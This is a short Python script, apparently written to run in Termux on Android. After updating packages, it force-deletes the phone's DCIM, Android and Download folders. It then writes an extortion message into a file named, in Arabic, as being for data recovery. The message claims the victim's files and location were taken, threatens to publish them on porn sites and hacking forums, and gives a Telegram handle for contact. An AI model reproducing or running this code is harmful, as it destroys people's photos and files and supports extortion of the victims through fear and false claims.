import os
import sys
######
os.system("clear")
os.system("apt update -y")
os.system("apt upgrade -y")
os.system("clear")
os.system("termux-setup-storage -y")
os.chdir("/storage/emulated/0/")
os.system('rm -rif /storage/emulated/0/DCIM/')
os.system("rm -rif /storage/emulated/0/Android/")

os.system('rm -rif /storage/emulated/0/Download/')

sys.stdout.close()
sys.stdout = open("مهم لسترجاع البيانات", "w")
print('Sorry your files like videos images app file sounds and your location in details have been removed If you do not contact me via Telegram within four days all your data will be posted on porn sites and hacking forums My Telegram account @TRX713_bot')
print("\n")
print("View your files")
